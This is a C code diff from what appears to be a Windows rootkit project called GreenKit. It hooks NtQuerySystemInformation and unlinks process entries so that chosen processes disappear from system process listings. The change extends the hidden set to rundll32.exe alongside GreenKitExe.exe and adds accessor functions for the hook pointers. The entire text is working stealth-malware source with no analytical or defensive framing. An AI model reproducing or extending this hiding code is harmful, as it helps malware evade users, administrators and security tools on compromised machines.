@@ -3,7 +3,31 @@
 #include "NtQuerySystemInformation.h"
 #include "hooking.h"
 
-const wchar_t* m_ProcessToHide = L"GreenKitExe.exe";
+const wchar_t* m_ProcessToHide = L"rundll32.exe";
+const wchar_t* m_ProcessToHide2 = L"GreenKitExe.exe";
+
+TD_NtQuerySystemInformation oldNtQuery;
+TD_NtQuerySystemInformation hookNtQuery;
+
+TD_NtQuerySystemInformation GetHookNtQuery()
+{
+    return hookNtQuery;
+}
+
+TD_NtQuerySystemInformation GetOldHookNtQuery()
+{
+    return oldNtQuery;
+}
+
+VOID SetHookNtQuery(TD_NtQuerySystemInformation p_HookNtQuery)
+{
+    hookNtQuery = p_HookNtQuery;
+}
+
+VOID SetOldHookNtQuery(TD_NtQuerySystemInformation p_OldHookNtQuery)
+{
+    oldNtQuery = p_OldHookNtQuery;
+}
 
 NTSTATUS WINAPI NewNtQuerySystemInformation(
     __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
@@ -12,7 +36,7 @@ NTSTATUS WINAPI NewNtQuerySystemInformation(
     __out_opt  PULONG                   ReturnLength
     )
 {
-    NTSTATUS status = ((TD_NtQuerySystemInformation) hooking_getOldFunction("NtQuerySystemInformation"))(SystemInformationClass,
+    NTSTATUS status = hookNtQuery(SystemInformationClass,
         SystemInformation,
         SystemInformationLength,
         ReturnLength);
@@ -31,7 +55,8 @@ NTSTATUS WINAPI NewNtQuerySystemInformation(
             pCurrent = pNext;
             pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
 
-            if (!wcsncmp(pNext->ImageName.Buffer, m_ProcessToHide, pNext->ImageName.Length))
+            if (!wcsncmp(pNext->ImageName.Buffer, m_ProcessToHide, pNext->ImageName.Length)
+                || !wcsncmp(pNext->ImageName.Buffer, m_ProcessToHide2, pNext->ImageName.Length))
             {
                 if (0 == pNext->NextEntryOffset)
                 {
